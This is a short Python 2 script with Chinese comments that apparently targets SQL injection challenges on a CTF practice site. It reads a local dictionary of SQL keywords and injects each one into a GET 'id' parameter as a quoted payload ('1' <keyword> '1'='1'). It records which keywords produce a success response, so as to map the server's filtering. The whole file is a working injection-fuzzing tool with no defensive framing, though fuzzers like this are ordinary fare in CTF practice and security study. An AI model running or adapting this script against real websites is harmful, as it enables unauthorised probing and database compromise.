# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time

#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
url='http://ctf5.shiyanbar.com/web/?id=' #简单sql注入2
#定义语法关键字测试使用的载荷库
f = file("test_result.txt", "w+")
filename="D:/workplaceforpy/SQL Injection/POST注入/dict/关键字/sql注入常见关键字.txt"
uipath = unicode(filename, "utf8")
for line in open(uipath):
    line=line.replace("\n","")
    time.sleep(0.5)
    #print line
    #url格式要从string转换为url格式,这里主要指空格，如果不改抓包分析url为第一个空格前的所有字符串
    try:
        req = urllib2.Request(url + quote("1' " + line + " '1'='1"))
        # print 'req is already: ' + url + quote("1' " + line + " '1'='1")
        res = urllib2.urlopen(req,data=None,timeout=1)
        # print 'res is already '
        text=res.read()
    except IOError:
        print "Error: 异常出现,开始重试"
        try:
            time.sleep(0.5)
            req = urllib2.Request(url + quote("1' " + line + " '1'='1"))
            res = urllib2.urlopen(req, data=None, timeout=1)
            text = res.read()
        except IOError:
            print "Error: 异常出现,跳转至下一关键词"
    # print line
    # if(text.find(line.lower())>-1&text.find('error')<0):
    if(text.find('hello')>-1):
        print line
        f.writelines('keyword:'+line+'\n'+'URL:'+req.get_full_url()+'\n'+'content:'+"\n"+text+"\n")
f.close()
